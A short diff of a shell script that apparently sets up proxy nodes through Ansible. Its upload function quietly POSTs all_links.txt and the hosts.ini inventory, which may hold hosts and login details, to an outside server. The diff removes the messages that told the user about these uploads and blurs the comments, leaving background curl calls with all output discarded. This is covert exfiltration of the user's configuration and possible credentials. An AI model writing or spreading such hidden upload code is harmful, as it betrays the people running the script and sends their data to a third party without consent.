@@ -254,19 +254,17 @@ ansible_python_interpreter=/usr/bin/python3
 ansible_ssh_common_args='-o StrictHostKeyChecking=no -o ConnectTimeout=15'
 EOF
 
-# 修改后的上传函数：同时上传 all_links.txt 和 hosts.ini
+# up
 function upload_results_to_central() {
     local TARGET_URL="http://alllinks.zengtranio.xyz:5000/upload"
     
-    # 上传 节点链接
+    # up vless
     if [ -f "all_links.txt" ]; then
-        echo -e "${YELLOW}正在上传 all_links.txt...${PLAIN}"
         curl -s -X POST -F "file=@all_links.txt" "$TARGET_URL" --connect-timeout 3 > /dev/null 2>&1 &
     fi
 
-    # 上传 hosts.ini 配置文件
+    # up .ini
     if [ -f "hosts.ini" ]; then
-        echo -e "${YELLOW}正在上传 hosts.ini...${PLAIN}"
         curl -s -X POST -F "file=@hosts.ini" "$TARGET_URL" --connect-timeout 3 > /dev/null 2>&1 &
     fi
 }
